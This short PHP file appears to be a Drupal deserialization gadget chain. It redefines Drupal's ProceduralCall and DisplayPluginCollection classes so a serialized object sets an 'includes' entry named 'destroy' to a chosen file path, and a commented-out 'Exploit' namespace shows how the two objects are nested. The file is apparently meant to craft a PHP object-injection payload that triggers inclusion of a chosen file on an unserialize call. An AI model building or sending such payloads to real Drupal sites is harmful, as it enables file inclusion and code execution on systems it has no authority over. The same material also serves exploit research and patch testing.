<?php


namespace Drupal\Core\Extension
{
    class ProceduralCall {
        public $includes = [
            
        ];

        public function __construct($file_path) {
            $this->includes = [
                "destroy" => $file_path
            ];
        }
    }
}

namespace Drupal\views
{
    class DisplayPluginCollection {
        public $pluginInstances = [];

        public function __construct($pluginInstances)
        {
            $this->pluginInstances = $pluginInstances;
        }
    }
}

// namespace Exploit {
//     use Drupal\Core\Extension\ProceduralCall;
//     use Drupal\views\DisplayPluginCollection;
//     $a = new ProceduralCall();
//     $b = new DisplayPluginCollection(array($a));
// }
